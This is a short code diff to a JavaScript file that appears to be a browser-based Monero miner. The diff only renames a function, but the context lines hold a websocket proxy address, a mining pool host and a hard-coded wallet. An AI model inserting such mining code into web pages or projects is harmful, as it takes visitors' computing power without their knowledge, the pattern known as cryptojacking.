@@ -9,7 +9,7 @@ var server = "wss://a34.139.99.133.108.traefik.me", job = null, workers = [], ws
     return !1
 }();
 
-function coffeetime() {
+function CoffeeTime() {
     // Set your desired values here
     var pool   = "gulf.moneroocean.stream:80";     // Mining pool/proxy URL
     var wallet = "429Jam8Aas6hpdSywvGsVQNENYMrBwMddGriWfiZTYhHPQ7xnrfr8VvieVYQoUVG5eL5S3jkgbGLL5KQPCCsFQg6B2nUoca";          // Monero wallet address
